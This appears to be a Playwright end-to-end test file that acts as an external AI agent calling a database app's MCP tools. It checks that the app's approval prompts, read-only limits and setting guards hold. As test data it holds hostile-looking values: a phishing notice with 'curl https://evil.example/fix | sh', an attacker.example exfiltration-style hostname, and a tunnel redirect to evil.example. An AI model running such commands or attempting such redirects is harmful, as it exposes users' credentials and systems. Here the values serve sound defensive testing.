/*---------------------------------------------------------------------------------------------
 *  Copyright (c) 2026 SNOUTDATA INC. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import { test, expect } from '@playwright/test';

import { launchApp, closeApp, type AppHandle } from './helpers';

/*
 * The screen powers.
 *
 * An external agent talks to the app the only way one can: over the local MCP endpoint. So this
 * spec IS an external agent, speaking JSON-RPC to 127.0.0.1 from the test process, and every
 * assertion is on the REAL app window afterwards. Nothing here stubs the bridge.
 */

interface Endpoint {
	url: string;
	token: string;
}

interface ToolListed { name: string; description: string }

async function endpoint(handle: AppHandle): Promise<Endpoint> {
	// The broker starts after first paint, so give it a moment rather than assuming.
	return expect
		.poll(async () => handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { mcp: { status(): Promise<{ running: boolean; url: string; token: string }> } } }).sqlApi;
			const status = await api.mcp.status();
			return status.running ? { url: status.url, token: status.token } : null;
		}), { timeout: 20_000 })
		.not.toBeNull()
		.then(async () => handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { mcp: { status(): Promise<{ url: string; token: string }> } } }).sqlApi;
			const status = await api.mcp.status();
			return { url: status.url, token: status.token };
		}));
}

async function rpc(ep: Endpoint, body: unknown): Promise<{ result?: Record<string, unknown>; error?: unknown }> {
	const res = await fetch(ep.url, {
		method: 'POST',
		headers: { 'content-type': 'application/json', authorization: `Bearer ${ep.token}` },
		body: JSON.stringify(body),
	});
	const text = await res.text();
	return text ? JSON.parse(text) : {};
}

async function callTool(ep: Endpoint, name: string, args: Record<string, unknown> = {}): Promise<{ text: string; isError: boolean }> {
	const res = await rpc(ep, { jsonrpc: '2.0', id: 1, method: 'tools/call', params: { name, arguments: args } });
	const result = res.result as { content: { text: string }[]; isError: boolean };
	return { text: result.content[0].text, isError: result.isError };
}

/** Let an agent change the app (off by default), the way Settings does it. */
/** Expose a connection to agents, as Settings, Agent access does: an agent may touch no other. */
async function exposeToAgents(handle: AppHandle, connectionId: string): Promise<void> {
	await handle.page.evaluate(async (id) => {
		const api = (window as unknown as { sqlApi: { mcp: { setAllowed(id: string, on: boolean): Promise<unknown> } } }).sqlApi;
		await api.mcp.setAllowed(id, true);
	}, connectionId);
}

async function setAllowMutating(handle: AppHandle, allowed: boolean): Promise<void> {
	await handle.page.evaluate(async (value) => {
		const api = (window as unknown as { sqlApi: { agentConsole: { setAllowMutating(v: boolean): Promise<unknown> } } }).sqlApi;
		await api.agentConsole.setAllowMutating(value);
	}, allowed);
}

test.describe('an agent acting on the app', () => {
	let handle: AppHandle;
	let ep: Endpoint;

	test.beforeAll(async () => {
		handle = await launchApp('agent-capabilities');
		ep = await endpoint(handle);
		await rpc(ep, { jsonrpc: '2.0', id: 1, method: 'initialize', params: { clientInfo: { name: 'claude-code' } } });
	});

	test.afterAll(async () => {
		await closeApp(handle);
	});

	test('the app\'s own actions are offered as tools, next to the database ones', async () => {
		const res = await rpc(ep, { jsonrpc: '2.0', id: 1, method: 'tools/list' });
		const names = ((res.result?.tools ?? []) as ToolListed[]).map((t) => t.name);
		expect(names).toContain('run_query');
		expect(names).toContain('get_app_state');
		expect(names).toContain('open_in_new_tab');
		expect(names).toContain('notify_user');
	});

	test('a read of the app needs no permission and answers from the live window', async () => {
		const out = await callTool(ep, 'get_app_state');
		expect(out.isError).toBe(false);
		// Whatever it says, it must be the real app: the untitled tab the app opens with.
		expect(out.text).toContain('Untitled');
	});

	test('with app changes off the agent may ASK, and the card says the answer turns it on', async () => {
		// This used to be a flat refusal with no card, and the agent was told to send the user to
		// Settings. Nobody opens a settings page to browse a list of things they have not heard of,
		// so the whole surface was discoverable only to whoever already knew about it.
		const before = await handle.page.locator('.tab-item').count();
		const pending = callTool(ep, 'open_in_new_tab', { sql: 'select 1' });
		const toast = handle.page.locator('.agent-action-toast');
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast).toContainText('switched off');
		await expect(toast).toContainText('Allowing this turns it on');
		await handle.page.screenshot({ path: 'e2e/.results/agent-approval-turns-on.png' });
		await handle.page.click('.agent-action-decline');
		const out = await pending;
		expect(out.isError).toBe(true);
		expect(out.text).toMatch(/Refused/);
		// Declined means declined: the switch is still off and the app did not move.
		await expect(handle.page.locator('.tab-item')).toHaveCount(before);
	});

	test('a no is a no: the next call is refused without asking again', async () => {
		// The switch being off is otherwise the only thing between a connected agent and an endless
		// supply of prompts, and prompt fatigue is how people learn to click Allow.
		const out = await callTool(ep, 'open_in_new_tab', { sql: 'select 2' });
		expect(out.isError).toBe(true);
		expect(out.text).toMatch(/Refused/);
		await expect(handle.page.locator('.agent-action-toast')).toHaveCount(0);
	});

	test('list_app_actions names every action, including the ones needing permission', async () => {
		// An agent shown only what it may do reports that the app CANNOT do the rest.
		const out = await callTool(ep, 'list_app_actions');
		expect(out.isError).toBe(false);
		expect(out.text).toContain('open_in_new_tab');
		expect(out.text).toContain('get_app_state');
		expect(out.text).toMatch(/OFF/);
	});

	test('once allowed, the user is still asked each time, and Allow moves the real UI', async () => {
		await setAllowMutating(handle, true);
		const before = await handle.page.locator('.tab-item').count();
		// Do not await the call: it blocks until the user answers, which is the point.
		const pending = callTool(ep, 'open_in_new_tab', { sql: 'select 42' });
		const toast = handle.page.locator('.agent-action-toast');
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast).toContainText('claude-code');
		await handle.page.screenshot({ path: 'e2e/.results/agent-approval.png' });
		await handle.page.click('.agent-action-actions button.primary');
		const out = await pending;
		expect(out.isError).toBe(false);
		await expect(handle.page.locator('.tab-item')).toHaveCount(before + 1);
	});

	test('Decline stops it, and nothing happens to the app', async () => {
		const before = await handle.page.locator('.tab-item').count();
		const pending = callTool(ep, 'open_in_new_tab', { sql: 'select 99' });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-decline');
		const out = await pending;
		expect(out.isError).toBe(true);
		expect(out.text).toMatch(/declined/i);
		await expect(handle.page.locator('.tab-item')).toHaveCount(before);
	});

	test('"Always allow this" is remembered, for that one action, until it is taken back', async () => {
		// The point of the grant: the SECOND call does not ask. If it did, the pending promise below
		// would hang on a toast nobody answers and the test would time out rather than pass quietly.
		const start = await handle.page.locator('.tab-item').count();
		const pending = callTool(ep, 'open_in_new_tab', { sql: 'select 7' });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-always');
		expect((await pending).isError).toBe(false);

		// Wait for THAT tab to land before counting. The tool call resolves when the capability
		// returns, which is before React has painted the tab, so counting here read a number from
		// the middle of a render and every later assertion was off by one.
		await expect(handle.page.locator('.tab-item')).toHaveCount(start + 1);
		const before = start + 1;
		const again = await callTool(ep, 'open_in_new_tab', { sql: 'select 8' });
		expect(again.isError).toBe(false);
		await expect(handle.page.locator('.tab-item')).toHaveCount(before + 1);
		await expect(handle.page.locator('.agent-action-toast')).toHaveCount(0);

		// It is one NAMED action, not a blanket yes: a different app change still asks.
		const other = callTool(ep, 'set_setting', { key: 'fontSize', value: 14 });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-decline');
		expect((await other).isError).toBe(true);

		// And taking it back brings the question back.
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { clearAutoApprove(): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.clearAutoApprove();
		});
		const third = callTool(ep, 'open_in_new_tab', { sql: 'select 9' });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-decline');
		expect((await third).isError).toBe(true);
	});

	test('turning app changes off forgets what was allowed through', async () => {
		const pending = callTool(ep, 'open_in_new_tab', { sql: 'select 10' });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-always');
		expect((await pending).isError).toBe(false);
		await setAllowMutating(handle, false);
		await setAllowMutating(handle, true);
		// Off is off: switching back on must not silently restore a standing yes.
		const after = callTool(ep, 'open_in_new_tab', { sql: 'select 11' });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-decline');
		expect((await after).isError).toBe(true);
	});

	test('the agent log is a timeline of what it actually did, refusals included', async () => {
		// Observed, not self-reported: every line here is something the app watched happen, which is
		// why a refusal appears too.
		//
		// Read one thing FIRST, so both kinds of line are recent. The list shows what fits, and the
		// read from the top of this file had been pushed off the end by the calls the tests in
		// between make: the assertion was really "the app has not done much yet".
		expect((await callTool(ep, 'get_app_state')).isError).toBe(false);
		await handle.page.keyboard.press('ControlOrMeta+Shift+P');
		await handle.page.fill('.palette input', 'Agent (MCP) Log');
		await handle.page.keyboard.press('Enter');
		const rows = handle.page.locator('.queries-list .query-row');
		await expect(rows.first()).toBeVisible({ timeout: 10_000 });
		const all = await rows.allInnerTexts();
		const text = all.join(' | ');
		expect(text).toContain('open_in_new_tab');
		expect(text).toContain('get_app_state');
		expect(text).toMatch(/refused/);
		expect(text).toContain('claude-code');
		// The app half and the database half are separable.
		await handle.page.click('.agent-log-kind >> text=The app');
		await expect(rows.first()).toBeVisible();
		await handle.page.screenshot({ path: 'e2e/.results/agent-log-timeline.png' });
	});

	test('the agent builds a monitor, and the app opens it', async () => {
		// The sentence this whole harness was described by ("make me a monitor") did not work,
		// because the view, the store and the poller all existed and none of it was reachable.
		const empty = await callTool(ep, 'list_monitors');
		expect(empty.isError).toBe(false);

		// Navigating writes nothing, so it must not ask.
		const opened = await callTool(ep, 'open_monitors');
		expect(opened.isError).toBe(false);
		await expect(handle.page.locator('.agent-action-toast')).toHaveCount(0);
		await expect(handle.page.locator('.tab-item', { hasText: 'Monitors' })).toBeVisible({ timeout: 10_000 });

		// No such connection, so it is REFUSED with the reason, in main, before anyone is asked.
		const created = await callTool(ep, 'create_monitor', {
			name: 'Slow queries',
			title: 'Rows scanned',
			sql: 'select 42',
			kind: 'trend',
			connectionId: 'e2e-missing',
		});
		expect(created.isError).toBe(true);
		expect(created.text).toMatch(/No connection matching/);
		await expect(handle.page.locator('.agent-action-toast')).toHaveCount(0);

		const second = callTool(ep, 'create_monitor', { name: 'Slow queries' });
		await expect(handle.page.locator('.agent-action-toast')).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-actions button.primary');
		const ok = await second;
		expect(ok.isError).toBe(false);
		expect(ok.text).toMatch(/Slow queries/);

		// And it is really there, by the app's own reckoning.
		const listed = await callTool(ep, 'list_monitors');
		expect(listed.text).toMatch(/Slow queries/);
	});

	test('a monitor query runs only on a connection the user allowed, only reads, and the card shows both', async () => {
		// A widget is a query the app then runs by itself every interval, across restarts. Before,
		// an agent could put any SQL on any saved connection, and a standing yes covered the next one.
		const dir = mkdtempSync(join(tmpdir(), 'snout-agent-monitor-'));
		const file = join(dir, 'm.db');
		const db = new DatabaseSync(file);
		db.exec('CREATE TABLE orders (id INTEGER); INSERT INTO orders VALUES (1)');
		db.close();
		const id = await handle.page.evaluate(async (path) => {
			const api = (window as unknown as { sqlApi: { saveConnection(form: unknown): Promise<{ id: string }> } }).sqlApi;
			return (await api.saveConnection({ label: 'Monitor target', driver: 'sqlite', host: '', port: 0, database: path, username: '', ssl: false, readOnly: false, environment: 'prod' })).id;
		}, file);
		const toast = handle.page.locator('.agent-action-toast');
		const widget = { monitor: 'Slow queries', title: 'Orders', connectionId: 'Monitor target' };

		// Not allowed for agents: refused, and nobody is asked.
		const notAllowed = await callTool(ep, 'add_monitor_widget', { ...widget, sql: 'select count(*) from orders' });
		expect(notAllowed.isError).toBe(true);
		expect(notAllowed.text).toMatch(/not exposed to agents/);
		await expect(toast).toHaveCount(0);

		await handle.page.evaluate(async (connectionId) => {
			const api = (window as unknown as { sqlApi: { mcp: { setAllowed(id: string, on: boolean): Promise<unknown> } } }).sqlApi;
			await api.mcp.setAllowed(connectionId, true);
		}, id);
		// A standing yes from earlier must not carry it either.
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { setAutoApprove(name: string, on: boolean): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.setAutoApprove('add_monitor_widget', true);
		});

		// Allowed, but a write: refused, and nobody is asked.
		const write = await callTool(ep, 'add_monitor_widget', { ...widget, sql: 'delete from orders' });
		expect(write.isError).toBe(true);
		expect(write.text).toMatch(/read-only/);
		await expect(toast).toHaveCount(0);

		// A read is asked about, naming the connection and the whole query, with no standing yes.
		const read = callTool(ep, 'add_monitor_widget', { ...widget, sql: 'select count(*) from orders' });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast.locator('.agent-action-changes')).toContainText('connection: Monitor target (prod)');
		await expect(toast.locator('.agent-action-changes')).toContainText('sql: select count(*) from orders');
		await expect(toast.locator('.agent-action-always')).toHaveCount(0);
		await handle.page.screenshot({ path: 'e2e/.results/agent-monitor-query.png' });
		await handle.page.click('.agent-action-actions button.primary');
		expect((await read).isError).toBe(false);
		const saved = await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { monitors: { list(): Promise<{ name: string; widgets: { connectionId: string; sql: string }[] }[]> } } }).sqlApi;
			return (await api.monitors.list()).find((m) => m.name === 'Slow queries')?.widgets ?? [];
		});
		// Pinned to the connection the card named, by id.
		expect(saved).toEqual([expect.objectContaining({ connectionId: id, sql: 'select count(*) from orders' })]);
		const check = new DatabaseSync(file);
		expect((check.prepare('SELECT count(*) AS n FROM orders').get() as { n: number }).n).toBe(1);
		check.close();
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { clearAutoApprove(): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.clearAutoApprove();
		});
	});

	test('an edit that moves a connection lists its changes and is asked every time', async () => {
		await setAllowMutating(handle, true);
		const id = await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { saveConnection(form: unknown): Promise<{ id: string }> } }).sqlApi;
			const saved = await api.saveConnection({ label: 'Edit target', driver: 'postgres', host: 'db.internal', port: 5432, username: 'app', ssl: false, readOnly: false });
			return saved.id;
		});
		await exposeToAgents(handle, id);
		const toast = handle.page.locator('.agent-action-toast');

		// A rename moves nothing: the card shows the change and offers "always", which is taken.
		const rename = callTool(ep, 'edit_connection', { id, label: 'Edit target 2' });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast.locator('.agent-action-changes')).toContainText('label: Edit target → Edit target 2');
		await expect(toast.locator('.agent-action-note')).toHaveCount(0);
		await handle.page.click('.agent-action-always');
		expect((await rename).isError).toBe(false);

		// A new host is asked about anyway, field by field, with no standing yes on offer.
		const move = callTool(ep, 'edit_connection', { id, host: 'elsewhere.example', port: 6543 });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast.locator('.agent-action-changes')).toContainText('host: db.internal → elsewhere.example');
		await expect(toast.locator('.agent-action-changes')).toContainText('port: 5432 → 6543');
		await expect(toast.locator('.agent-action-note')).toContainText('saved password is removed');
		await expect(toast.locator('.agent-action-always')).toHaveCount(0);
		await handle.page.screenshot({ path: 'e2e/.results/agent-edit-connection-moves.png' });
		await handle.page.click('.agent-action-actions button.primary');
		const moved = await move;
		expect(moved.isError).toBe(false);
		expect(moved.text).toContain('saved password is removed');

		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { clearAutoApprove(): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.clearAutoApprove();
		});
	});

	test('switching a connection off production or off read-only is asked every time, old → new, whatever was granted', async () => {
		await setAllowMutating(handle, true);
		const id = await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { saveConnection(form: unknown): Promise<{ id: string }> } }).sqlApi;
			const saved = await api.saveConnection({ label: 'Guarded', driver: 'postgres', host: 'db.internal', port: 5432, username: 'app', ssl: false, readOnly: true, environment: 'prod' });
			return saved.id;
		});
		await exposeToAgents(handle, id);
		// A standing yes for edits, as a person would have given it for a rename.
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { setAutoApprove(name: string, on: boolean): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.setAutoApprove('edit_connection', true);
		});
		const toast = handle.page.locator('.agent-action-toast');
		for (const [args, line] of [[{ environment: 'dev' }, 'environment: prod → dev'], [{ readOnly: false }, 'read-only: on → off']] as const) {
			const pending = callTool(ep, 'edit_connection', { id, ...args });
			await expect(toast).toBeVisible({ timeout: 10_000 });
			await expect(toast.locator('.agent-action-changes')).toContainText(line);
			await expect(toast.locator('.agent-action-note')).toContainText('asked every time');
			await expect(toast.locator('.agent-action-always')).toHaveCount(0);
			await handle.page.click('.agent-action-decline');
			expect((await pending).isError).toBe(true);
		}
		const after = await handle.page.evaluate(async (connectionId) => {
			const api = (window as unknown as { sqlApi: { state(): Promise<{ connections: { id: string; environment?: string; readOnly?: boolean }[] }> } }).sqlApi;
			return (await api.state()).connections.find((c) => c.id === connectionId);
		}, id);
		expect(after).toEqual(expect.objectContaining({ environment: 'prod', readOnly: true }));
		// A rename is still covered by the standing yes.
		expect((await callTool(ep, 'edit_connection', { id, label: 'Guarded 2' })).isError).toBe(false);
		await expect(toast).toHaveCount(0);
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { clearAutoApprove(): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.clearAutoApprove();
		});
	});

	test('moving a saved SSH tunnel is asked every time, old → new, and names the connections through it', async () => {
		await setAllowMutating(handle, true);
		const ids = await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: {
				saveTunnel(form: unknown): Promise<{ id: string }>;
				saveConnection(form: unknown): Promise<{ id: string }>;
			} }).sqlApi;
			const tunnel = await api.saveTunnel({ name: 'Edit bastion', host: 'bastion.internal', port: 22, username: 'ec2-user', password: 'ssh-secret' });
			const conn = await api.saveConnection({ label: 'Through bastion', driver: 'postgres', host: 'db.internal', port: 5432, username: 'app', password: 'db-secret', ssl: false, readOnly: false, sshTunnelRef: tunnel.id });
			return { tunnel: tunnel.id, conn: conn.id };
		});
		// A standing yes for tunnel edits cannot be given or used: the action is always asked.
		const toast = handle.page.locator('.agent-action-toast');
		const decline = callTool(ep, 'edit_tunnel', { id: ids.tunnel, host: 'evil.example', port: 2222 });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast.locator('.agent-action-changes')).toContainText('ssh host: bastion.internal → evil.example');
		await expect(toast.locator('.agent-action-changes')).toContainText('ssh port: 22 → 2222');
		await expect(toast.locator('.agent-action-changes')).toContainText('connections using it: Through bastion');
		await expect(toast.locator('.agent-action-note')).toContainText('database password of every connection');
		await expect(toast.locator('.agent-action-always')).toHaveCount(0);
		await handle.page.screenshot({ path: 'e2e/.results/agent-edit-tunnel-moves.png' });
		await handle.page.click('.agent-action-decline');
		expect((await decline).isError).toBe(true);
		const unchanged = await handle.page.evaluate(async (id) => {
			const api = (window as unknown as { sqlApi: { tunnelsState(): Promise<{ profiles: { id: string; host: string }[] }> } }).sqlApi;
			return (await api.tunnelsState()).profiles.find((p) => p.id === id)?.host;
		}, ids.tunnel);
		expect(unchanged).toBe('bastion.internal');

		const approve = callTool(ep, 'edit_tunnel', { id: ids.tunnel, host: 'elsewhere.example' });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-actions button.primary');
		const moved = await approve;
		expect(moved.isError).toBe(false);
		expect(moved.text).toContain('saved database password of every connection that uses it');
		await handle.page.evaluate(async ({ tunnel, conn }) => {
			const api = (window as unknown as { sqlApi: { deleteConnection(id: string): Promise<unknown>; deleteTunnel(id: string): Promise<unknown> } }).sqlApi;
			await api.deleteConnection(conn);
			await api.deleteTunnel(tunnel);
		}, ids);
	});

	test('a setting change shows the setting and its value, never offers a standing yes, and cannot touch the prod confirmation', async () => {
		await setAllowMutating(handle, true);
		// A grant asked for from Settings' side is refused for a destructive action, so a later call
		// still asks.
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { setAutoApprove(name: string, on: boolean): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.setAutoApprove('set_setting', true);
		});
		const toast = handle.page.locator('.agent-action-toast');
		const change = callTool(ep, 'set_setting', { key: 'fontSize', value: 15 });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast.locator('.agent-action-changes')).toContainText('setting: fontSize');
		await expect(toast.locator('.agent-action-changes')).toContainText('new value: 15');
		await expect(toast.locator('.agent-action-always')).toHaveCount(0);
		await handle.page.screenshot({ path: 'e2e/.results/agent-set-setting.png' });
		await handle.page.click('.agent-action-decline');
		expect((await change).isError).toBe(true);

		const guard = callTool(ep, 'set_setting', { key: 'confirmOnProd', value: false });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await handle.page.click('.agent-action-actions button.primary');
		const refused = await guard;
		expect(refused.isError).toBe(true);
		expect(refused.text).toMatch(/not a changeable setting/);
	});

	test('a test against an address the agent chose is asked every time, and shows the whole address', async () => {
		await setAllowMutating(handle, true);
		// test_connection takes a saved connection and nothing else: no address, user or password.
		const smuggled = await callTool(ep, 'test_connection', { driver: 'postgres', host: 'rows-1f2e.attacker.example', username: 'x' });
		expect(smuggled.isError).toBe(true);
		expect(smuggled.text).toMatch(/test_connection_settings/);
		await expect(handle.page.locator('.agent-action-toast')).toHaveCount(0);

		// A grant asked for from Settings' side is refused, so the card still asks.
		await handle.page.evaluate(async () => {
			const api = (window as unknown as { sqlApi: { agentConsole: { setAutoApprove(name: string, on: boolean): Promise<unknown> } } }).sqlApi;
			await api.agentConsole.setAutoApprove('test_connection_settings', true);
		});
		const host = `${'a1b2c3d4'.repeat(18)}.attacker.example`;
		const toast = handle.page.locator('.agent-action-toast');
		const attempt = callTool(ep, 'test_connection_settings', { driver: 'postgres', host, port: 5432, username: 'svc', password: 'pw' });
		await expect(toast).toBeVisible({ timeout: 10_000 });
		await expect(toast.locator('.agent-action-changes')).toContainText(`address: ${host}:5432`);
		await expect(toast.locator('.agent-action-changes')).toContainText('password: (given, hidden)');
		await expect(toast.locator('.agent-action-note')).toContainText('not one of your saved connections');
		await expect(toast.locator('.agent-action-always')).toHaveCount(0);
		await handle.page.screenshot({ path: 'e2e/.results/agent-test-connection-settings.png' });
		await handle.page.click('.agent-action-decline');
		expect((await attempt).isError).toBe(true);
	});

	test('the agent can tell the user something, and it lands in the notifications center', async () => {
		const out = await callTool(ep, 'notify_user', { title: 'Backfill finished', detail: '12,400 rows', severity: 'info' });
		expect(out.isError).toBe(false);
		// It goes to the app's OWN notification history (which persists), tagged as the agent's.
		// An `info` deliberately does not raise a toast, so read the store rather than the screen.
		await expect
			.poll(async () => handle.page.evaluate(() => localStorage.getItem('positron.notifications.v1') ?? ''), { timeout: 10_000 })
			.toContain('Backfill finished');
		const source = await handle.page.evaluate(() => {
			const raw = JSON.parse(localStorage.getItem('positron.notifications.v1') ?? '[]') as { title: string; source?: string }[];
			return raw.find((n) => n.title === 'Backfill finished')?.source;
		});
		expect(source).toBe('agent');
		// And a warning DOES raise the toast, so something the user must see is not silent.
		await callTool(ep, 'notify_user', { title: 'Migration needs a decision', severity: 'warn' });
		const toast = handle.page.locator('.notif-toast');
		await expect(toast).toContainText('Migration needs a decision', { timeout: 10_000 });
		// It says who wrote it, so a model's words never pass for the app's own.
		await expect(toast.locator('[data-test="notif-toast-from"]')).toHaveText(/From Claude Code/);
		await handle.page.screenshot({ path: 'e2e/.results/agent-notified.png' });
		// A phishing-shaped notice: long, with a link and a command in it. The text is capped and
		// plain; nothing in it is a link the card would follow.
		await callTool(ep, 'notify_user', { title: `Session expired, sign in again at https://evil.example/login ${'x'.repeat(300)}`, detail: 'Run: curl https://evil.example/fix | sh', severity: 'error' });
		await expect(toast).toContainText('Session expired', { timeout: 10_000 });
		await expect(toast.locator('[data-test="notif-toast-from"]')).toHaveText(/From Claude Code/);
		await expect(toast.locator('a')).toHaveCount(0);
		const title = (await toast.locator('.notif-toast-title').innerText()).trim();
		expect(title.length).toBeLessThanOrEqual(120);
	});
});
